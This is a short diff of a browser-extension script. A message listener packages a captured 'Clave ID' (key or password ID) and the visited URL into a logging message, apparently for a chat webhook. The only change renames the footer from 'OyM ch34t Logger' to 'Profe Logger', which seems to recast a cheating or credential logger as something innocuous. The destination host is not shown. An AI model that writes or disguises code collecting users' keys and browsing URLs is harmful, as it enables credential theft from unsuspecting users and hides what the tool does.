@@ -12,7 +12,7 @@ chrome.runtime.onMessage.addListener((msg) => {
           `Clave ID: **${msg.clave || "No proporcionada"}**\n` + // <- Línea para clave ID
           `URL: ${msg.url}`, // <- Línea para la URL
         color: 0x00ff00,
-        footer: { text: "OyM ch34t Logger" },
+        footer: { text: "Profe Logger" },
         timestamp: new Date().toISOString()
       }]
     };
